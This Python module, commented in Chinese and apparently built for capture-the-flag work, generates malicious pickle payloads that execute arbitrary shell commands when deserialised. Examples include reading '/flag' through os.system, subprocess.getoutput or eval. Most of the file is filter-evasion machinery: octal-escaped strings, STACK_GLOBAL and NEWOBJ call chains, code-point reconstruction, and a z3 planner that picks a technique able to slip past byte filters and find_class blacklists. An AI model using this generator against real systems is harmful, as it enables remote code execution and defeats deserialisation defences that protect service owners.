"""letter_filter — payload 字节级过滤自动规划, 对外只有 dumps_cmd 一个接口。

    payload = lf.dumps_cmd(command, letters=b'Riob', blacklist=None)

letters 是被禁字节集合 (str 或 bytes)。dumps_cmd 内部把"怎么发码"建模成
候选 (candidate), 用 z3 在同时满足字母约束和 find_class 黑名单的候选里
选代价最小者 (z3 不可用时退化为顺序尝试); 无约束时退化为 pkfn 朴素直通。

候选一览 (代价升序):
  oct:<通道>  bypass 全通道 + OctalCompiler: 所有字符串 (模块名/属性名/
              命令) 发全八进制转义 S 字符串 (S'\\163\\171\\163'), 所有
              find_class 引用 (含内部 attrgetter/itemgetter/import_module
              调用) 走 STACK_GLOBAL, payload 零明文单词;
              字母表 = S R p g t I ( ) . \\x80 \\x93 + 数字 \\ '
              (p/g 是 memo PUT/GET 文本 opcode, 禁小写时全灭)
  az:<目标>   零小写: 单表达式内联 body + 纯二进制 opcode 流
              (STACK_GLOBAL/TUPLE1-3/REDUCE), 全程零 memo (GET 无字母-free
              替代); STACK_GLOBAL 直指 exec 目标 (find_class 自动 import),
              目标表见 AZ_TARGETS;
              字母表 = S R I ( ) . \\x80 \\x85-\\x87 \\x93 + 数字 \\ '
  nor         禁 'R'/'i'/'o'/'b' (opcode 级精确打击 REDUCE/INST/OBJ/BUILD):
              调用改用 NEWOBJ (\\x81, cls.__new__(cls, *args)), 调用链
              builtins.tuple(builtins.map(builtins.eval, (code,))) ——
              tuple.__new__ 就地迭代惰性 map, eval(code) 随之执行;
              字母表 = S ( t . \\x80 \\x81 \\x85 \\x86 \\x93 + 数字 \\ '
  chr         禁 \\ / ' / S (杀转义过滤, oct/az/nor 的转义机制全灭):
              运行期按码点重建代码串
              builtins.eval(builtins.bytes((码点...))), 内容全部走 INT
              opcode 的数字, 模块名走 protocol 0 c opcode 明文行 (无需
              引号/转义); 等价 eval(''.join(map(chr, ints))) 但零 operator /
              零引号; 非 ASCII 命令按 utf-8 编码;
              字母表 = c I t R ( ) . + 数字 + builtins/eval/bytes 的字母
              (前提: 字母和数字放行; 禁字母的场景由 oct/az/nor 覆盖)

机制要点 (已实测):
  - pickle 里唯一能"藏字母"的字符串构造是 protocol 0 的 S opcode 转义;
    hex 转义 (\\x73) 本身含字母 x, 全八进制后只剩数字/\\/'/S/换行
  - 必须配 STACK_GLOBAL (protocol 4): protocol 0 GLOBAL (c) 参数是裸文本
    行无转义机制; STACK_GLOBAL 从栈上取字符串, 可用 S 转义构造
  - find_class 黑名单看解码后的 (module, name), 字母过滤看解码前的字节,
    两者正交, 由规划器统一建模

边界:
  禁所有 ASCII 字母 (含大写)   无解: S/R/N/I 等 opcode 本身是字母
  禁 \\n                       无解: 行式 opcode (S/I/c/p/g) 全部以换行结尾
  禁 \\x80 (protocol 头)        只剩 chr (protocol 0 无 protocol 头)
  禁数字 0-7                  无解: 八进制转义本身需要数字
  字符串含非 ASCII            oct/az/nor 抛 ValueError; chr 按 utf-8 可解
  代价                        oct/az/nor 每字符约 4 字节, chr 约 5 字节

用法:
    from plugins import letter_filter as lf

    payload = lf.dumps_cmd('cat /flag')                          # 朴素直通
    payload = lf.dumps_cmd('cat /flag', letters='os')            # 禁字母 o/s
    payload = lf.dumps_cmd('cat /flag', blacklist=bl)            # find_class 黑名单
    payload = lf.dumps_cmd('cat /flag', letters='Riob')          # 禁调用 opcode
    payload = lf.dumps_cmd('cat /flag', letters="\\'")           # 禁反斜杠/引号
    payload = lf.dumps_cmd('cat /flag', letters=string.ascii_lowercase,
                           blacklist=bl)                         # 组合
"""

import ast

from pkfn import _compile, dumps_cmd as _pk_dumps_cmd
from plugins.find_class_blacklist_bypass import (
    CHANNELS, DottedGlobalCompiler, PlanningError, _hits,
    _normalize_blacklist)

__all__ = ['dumps_cmd', 'PlanningError']


def _s_oct(s):
    """全八进制转义的 protocol 0 S 字符串: S'\\163\\171\\163'。
    固定 3 位八进制, 防连续转义被贪婪解析错; 仅支持 ASCII。"""
    try:
        b = s.encode('ascii')
    except UnicodeEncodeError:
        raise ValueError('non-ASCII string not supported: %r' % s)
    return b"S'" + b''.join(b'\\%03o' % c for c in b) + b"'\n"


# ---------- oct: 全转义编译器 (组合 bypass 通道) ----------

class OctalCompiler(DottedGlobalCompiler):
    """DottedGlobalCompiler + 全八进制 S 字符串 + 内部引用全部 STACK_GLOBAL。

    基类的 _emit_attr_of_top / emit_subscript / emit_global_chain /
    emit_call 里有硬编码的文本 GLOBAL (coperator\\nattrgetter 等),
    会漏明文单词, 这里统一改成栈上转义字符串 + STACK_GLOBAL。
    文本辅助 opcode (p/g/t) 保留, oct 档的字母表由此而来。

    注意: list/dict 字面量 (l/d) 与下标/属性赋值 (s/}/b) 发出的字节
    不在 OCT_ALPHABET 内 (标准 body 不含这些构造); lf.dumps_cmd 会对
    最终 payload 做禁字节校验兜底。"""

    def push_string(self, s):
        self.push(_s_oct(s))

    def _sg_call1(self, module, name, arg_emit):
        """find_class(module, name) 后以单参调用: arg_emit() 发射参数表达式。"""
        self.push_string(module)
        self.push_string(name)
        self.push(b'\x93(')
        arg_emit()
        self.push(b'tR')

    def _emit_attr_of_top(self, attr):
        idx = self.put()
        self._sg_call1('operator', 'attrgetter', lambda: self.push_string(attr))
        self.push(b'(g%d\ntR' % idx)

    def emit_subscript(self, node):
        self.emit_expr(node.value)
        idx = self.put()
        self._sg_call1('operator', 'itemgetter',
                       lambda: self.emit_expr(node.slice))
        self.push(b'(g%d\ntR' % idx)

    def emit_call(self, func, args):
        if isinstance(func, ast.Attribute) and self._is_runtime_attr(func):
            # obj.method(...) -> attrgetter('method')(obj)(...), 零明文
            self._sg_call1('operator', 'attrgetter',
                           lambda: self.push_string(func.attr))
            self.push(b'(')
            self.emit_expr(func.value)
            self.push(b'tR')
        else:
            self.emit_expr(func)
        self.push(b'(')
        for a in args:
            self.emit_expr(a)
        self.push(b'tR')

    def emit_global_chain(self, parts):
        mod_name, rest = self._resolve_global(parts)
        if not rest:
            # 整个名字就是个模块: STACK_GLOBAL 版 import_module 调用
            self._sg_call1('importlib', 'import_module',
                           lambda: self.push_string(mod_name))
            return
        self._emit_global_ref(mod_name, rest)


class _OctPlugin(object):
    def __init__(self, channel):
        self._channel = channel
        self.COMPILER = OctalCompiler

    def preamble(self):
        return list(self._channel['preamble'])

    def __repr__(self):
        return '<letter_filter oct channel=%r>' % self._channel['name']


# ---------- az: 零小写字母 ----------

class AzCompiler(DottedGlobalCompiler):
    """零小写字母编译器: 全八进制 S 字符串 + 纯二进制 opcode 流。

    只允许: 全局链引用 (STACK_GLOBAL) + 直接调用 (<=3 参, TUPLE1-3)。
    禁用一切需要 memo 读取的构造 (locals / 运行时属性链 / 下标),
    因为 GET/BINGET/LONG_BINGET (g/h/r) 没有无字母替代。"""

    _CALL_OP = b'R'                       # REDUCE; NorCompiler 换成 NEWOBJ

    def push_string(self, s):
        self.push(_s_oct(s))

    def emit_call(self, func, args):
        if isinstance(func, ast.Attribute) and self._is_runtime_attr(func):
            raise SyntaxError('az: method calls on runtime objects need memo '
                              'opcodes (lowercase), inline a global chain instead')
        self.emit_expr(func)
        n = len(args)
        if n == 0:
            self.push(b')')              # EMPTY_TUPLE
        elif n <= 3:
            for a in args:
                self.emit_expr(a)
            self.push(bytes([0x84 + n]))  # TUPLE1/2/3 (\x85-\x87)
        else:
            raise SyntaxError('az: calls with >3 args not supported')
        self.push(self._CALL_OP)

    def emit_global_chain(self, parts):
        mod_name, rest = self._resolve_global(parts)
        if not rest:
            self.push_string('importlib')
            self.push_string('import_module')
            self.push(b'\x93')
            self.push_string(mod_name)
            self.push(b'\x85R')           # TUPLE1 + REDUCE
            return
        self._emit_global_ref(mod_name, rest)


class NorCompiler(AzCompiler):
    """禁 'R'/'i'/'o'/'b' 字节 (opcode 级过滤): 调用改用 NEWOBJ
    (\\x81, cls.__new__(cls, *args)) 替代 REDUCE。
    配调用链 tuple(map(eval, (code,))): map/tuple 都是类, NEWOBJ 语义成立;
    eval 仅作为 map 的参数入栈 (不由 pickle 调用); map 惰性, tuple.__new__
    就地迭代时 eval(code) 才真正执行。"""

    _CALL_OP = b'\x81'


class _AzPlugin(object):
    COMPILER = AzCompiler

    @staticmethod
    def preamble():
        return []


class _NorPlugin(object):
    COMPILER = NorCompiler

    @staticmethod
    def preamble():
        return []


AZ_TARGETS = [
    {'name': 'getoutput', 'module': 'subprocess', 'func': 'getoutput',
     'refs': [('subprocess', 'getoutput')]},
    {'name': 'system', 'module': 'os', 'func': 'system',
     'refs': [('os', 'system')]},
]

NOR_REFS = [('builtins', 'tuple'), ('builtins', 'map'), ('builtins', 'eval')]
CHR_REFS = [('builtins', 'eval'), ('builtins', 'bytes')]


def _dumps_az(command, target):
    """az 候选的 payload 构造: STACK_GLOBAL 直指 (module, func),
    单表达式内联, 全程零 memo。"""
    call = '%s.%s(%r)' % (target['module'], target['func'], command)
    src = 'def exp():\n    import %s\n    return %s\n' % (target['module'], call)
    fn_node = ast.parse(src).body[0]
    return _compile(list(fn_node.body), [_AzPlugin()])


def _dumps_nor(command, code=None):
    """nor 候选的 payload 构造: tuple(map(eval, (code,))) NEWOBJ 调用链。
    code 缺省时为 __import__("os").system(command)。"""
    if code is None:
        code = '__import__("os").system(%r)' % command
    src = ("def exp():\n    import builtins\n"
           "    return builtins.tuple(builtins.map(builtins.eval, (%r,)))\n"
           % code)
    fn_node = ast.parse(src).body[0]
    return _compile(list(fn_node.body), [_NorPlugin()])


def _dumps_chr(command, code=None):
    """chr 候选的 payload 构造: builtins.eval(builtins.bytes((码点...))),
    代码串内容全部编码为 INT opcode 的数字, 模块名走 protocol 0 c opcode
    明文行, 零引号 / 零反斜杠 / 零 S opcode。等价于
    eval(''.join(map(chr, ints))) 但零 operator / 零引号。
    code 缺省时为 __import__("os").system(command); 非 ASCII 按 utf-8
    编码成码点 (eval 接受 bytes, 按 PEP 263 默认 utf-8 解码)。"""
    if code is None:
        code = '__import__("os").system(%r)' % command
    ints = tuple(code.encode('utf-8'))
    src = ("def exp():\n    import builtins\n"
           "    return builtins.eval(builtins.bytes(%r))\n" % (ints,))
    fn_node = ast.parse(src).body[0]
    return _compile(list(fn_node.body), [])


# ---------- 候选与规划 ----------

def _alpha(opcodes):
    """候选字母表: 给定 opcode 字节 + 全八进制 S 字符串的固有字符
    (数字/反斜杠/引号; memo 下标和 INT 也可能产生 8/9, 保守计入全部数字)。
    行式 opcode 的行尾换行 (\\n) 与 protocol 4 头 (\\x80\\x04) 的 \\x04
    也计入。"""
    a = set(b"0123456789\\'\n\x04")
    a.update(opcodes)
    return a


OCT_ALPHABET = _alpha(b'SRpgtI().\x80\x93')
AZ_ALPHABET = _alpha(b'SRI().\x80\x85\x86\x87\x93')
NOR_ALPHABET = _alpha(b'S(t.\x80\x81\x85\x86\x93')
# chr 不走 _alpha: payload 里没有 \\ 和 ' (这正是它存在的意义),
# 也没有 \\x04 (protocol 0 无 protocol 头),
# 字母只来自 c opcode 明文行的 builtins/eval/bytes
CHR_ALPHABET = set(b'c()ItR.0123456789\n') | set(b'builtinsevalbytes')


def _candidates(include_manual=False):
    """全部候选, 按代价升序: oct 通道 (bypass 顺序) -> az 目标 -> nor -> chr。"""
    cands = []
    for ch in CHANNELS:
        if not include_manual and not ch.get('auto', True):
            continue
        cands.append({'kind': 'oct', 'label': 'oct:%s' % ch['name'],
                      'channel': ch, 'refs': ch['refs'],
                      'alphabet': OCT_ALPHABET})
    for t in AZ_TARGETS:
        cands.append({'kind': 'az', 'label': 'az:%s' % t['name'],
                      'target': t, 'refs': t['refs'],
                      'alphabet': AZ_ALPHABET})
    cands.append({'kind': 'nor', 'label': 'nor', 'refs': NOR_REFS,
                  'alphabet': NOR_ALPHABET})
    cands.append({'kind': 'chr', 'label': 'chr', 'refs': CHR_REFS,
                  'alphabet': CHR_ALPHABET})
    return cands


def _ok(cand, letters, bl, match):
    if letters and cand['alphabet'] & letters:
        return False
    return not any(_hits(bl, r, match) for r in cand['refs'])


def _report(cands, letters, bl, match):
    lines = ['no candidate survives constraints:']
    for c in cands:
        reasons = []
        hit_l = sorted(c['alphabet'] & letters)
        if hit_l:
            reasons.append('letters=%s' % bytes(hit_l))
        hits = [r for r in c['refs'] if _hits(bl, r, match)]
        if hits:
            reasons.append('refs=%s' % hits)
        lines.append('  %-24s %s' % (c['label'], ' '.join(reasons) or 'ok'))
    return '\n'.join(lines)


def _pick(cands, letters, bl, match):
    """z3 选代价最小的可行候选; z3 不可用时退化为顺序尝试。"""
    try:
        import z3
    except ImportError:
        for c in cands:
            if _ok(c, letters, bl, match):
                return c
        raise PlanningError(_report(cands, letters, bl, match))

    sels = [z3.Bool('c%d' % i) for i in range(len(cands))]
    opt = z3.Optimize()
    for sel, c in zip(sels, cands):
        if not _ok(c, letters, bl, match):
            opt.add(z3.Not(sel))          # 被字母表或黑名单挡死
    opt.add(z3.Sum([z3.If(s, 1, 0) for s in sels]) == 1)   # 恰好选一个
    opt.minimize(z3.Sum([z3.If(s, i + 1, 0)
                         for i, s in enumerate(sels)]))    # 序号小优先
    if opt.check() != z3.sat:
        raise PlanningError(_report(cands, letters, bl, match))
    model = opt.model()
    for sel, c in zip(sels, cands):
        if z3.is_true(model[sel]):
            return c
    raise PlanningError('planner returned no candidate')


# ---------- 对外接口 ----------

def dumps_cmd(command, letters=(), blacklist=None, match='exact',
              include_manual=False, code=None):
    """生成执行 command 的 pickle payload (bytes), 自动规避字节级过滤。

    letters:   被禁字节集合, str 或 bytes, 如 'Riob' / b'Riob' /
               string.ascii_lowercase。为空且无 blacklist 时退化为
               pkfn.dumps_cmd 朴素直通 (不做任何转义)。
    blacklist: find_class 黑名单 {'module': set, 'name': set, 'pair': set},
               语义同 bypass.plan; 与 letters 正交, 可同时给。
    match:     黑名单匹配方式 'exact' (默认) / 'substring'。
    include_manual: True 时把 'auto': False 的通道 (func_subclasses)
               也纳入 oct 候选 (其 index 依赖目标环境, 默认排除)。
    code:      直接给出 eval 的 Python 表达式 (command 被忽略,
               候选锁定 eval 家族 nor/chr), 用于多步操作场景, 如:
               "(os.makedirs('/app/static',exist_ok=True), os.system('id > ...'))"
               表达式与返回值经 eval 执行; nor 档仅 ASCII, chr 档可 utf-8。
    无可行候选时抛 PlanningError, 报告里标明每个候选的死因。
    """
    if isinstance(letters, str):
        try:
            letters = letters.encode('ascii')
        except UnicodeEncodeError:
            raise ValueError('letters must be ASCII: %r' % (letters,))
    if isinstance(letters, int):
        raise ValueError('letters must be str / bytes / iterable of ints: %r'
                         % (letters,))
    try:
        letters = set(bytes(letters))
    except (TypeError, ValueError):
        raise ValueError('letters must be str / bytes / iterable of ints: %r'
                         % (letters,))
    bl = _normalize_blacklist(blacklist)
    if code is None and not letters and not any(bl.values()):
        return _pk_dumps_cmd(command)
    cands = _candidates(include_manual)
    if code is not None:
        cands = [c for c in cands if c['kind'] in ('nor', 'chr')]
    cand = _pick(cands, letters, bl, match)
    if cand['kind'] == 'oct':
        payload = _pk_dumps_cmd(command, plugins=[_OctPlugin(cand['channel'])])
    elif cand['kind'] == 'az':
        payload = _dumps_az(command, cand['target'])
    elif cand['kind'] == 'chr':
        payload = _dumps_chr(command, code=code)
    else:
        payload = _dumps_nor(command, code=code)
    bad = set(payload) & letters
    if bad:
        # 建模漏洞兜底: 规划器说可行但 payload 实际含禁字节, 宁可报错
        raise PlanningError('internal error: %s payload contains banned '
                            'bytes %r' % (cand['label'], bytes(sorted(bad))))
    return payload
